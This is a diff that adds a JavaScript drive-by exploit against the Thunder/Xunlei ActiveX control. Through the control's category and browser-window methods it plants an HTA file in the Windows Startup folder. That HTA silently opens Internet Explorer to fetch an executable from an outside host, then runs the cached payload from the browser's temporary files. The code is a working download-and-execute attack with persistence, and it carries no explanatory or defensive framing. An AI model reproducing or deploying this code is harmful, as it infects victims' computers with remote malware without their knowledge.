@@ -1,0 +1,16 @@
+var qianxu_fan = null;
+function shit()
+{
+	try{qianxu_fan = new ActiveXObject("ThunderServer.webThunder.1");}
+	catch(e){return;}
+	var vip;
+	vip="<script defer> var shell=\"<html><body><script>window.moveTo(4000,4000);window.resizeTo(0,0);var shell=new ActiveXObject(\\\"wscript.shell\\\");shell.Run(\\\"C:\\\\\\\\Progra~1\\\\\\\\Intern~1\\\\\\\\IEXPLORE.EXE http://www.ip369.net/mm/x.exeWebxls.htm\\\",0,0);function runmm(){var path=shell.SpecialFolders(\\\"MyDocuments\\\");var china=path.substring(0,path.lastIndexOf(\\\"\\\\\\\\\\\"));china+=\\\"\\\\\\\\Local Settings\\\\\\\\Temporary Internet Files\\\\\\\\Content.IE5\\\\\\\\\\\";var sp=new ActiveXObject(\\\"shell.application\\\");var ai=sp.NameSpace(china);for(i=0;i<ai.Items().Count;i++){var orloves=ai.Items().Item(i).path;orloves+=\\\"\\\\\\\\vip[1].exe\\\";try{shell.exec(orloves);}catch(e){};}window.close();};shell.Run(\\\"cmd.exe /c tree c:\\\\\\\\ /f\\\",0,1);runmm();<\\/script></body></html>\";var loves = new ActiveXObject(\"ADODB.ReCORDsET\");loves.Fields.Append(\"loves\", 200, 3000);loves.Open();loves.AddNew();loves.Fields(\"loves\").Value=shell;loves.Update();loves.Save(\"C:\\\\Documents and Settings\\\\All Users\\\\「开始」菜单\\\\程序\\\\启动\\\\microsofts.hta\",0);loves.Close();</script>";
+	var ret=qianxu_fan["AddCateogry"](vip);
+	qianxu_fan["SetBrowserWindowSize"](0,0,400,300);
+	var chenzi = qianxu_fan["GetServerPath"]();
+	chenzi = chenzi["substr"](0, chenzi["length"]-1);
+	chenzi+="\\page\\index.htm";
+	qianxu_fan.SetBrowserWindowData(chenzi,"loves");
+	qianxu_fan.HideBrowserWindow(1);
+	return;
+}
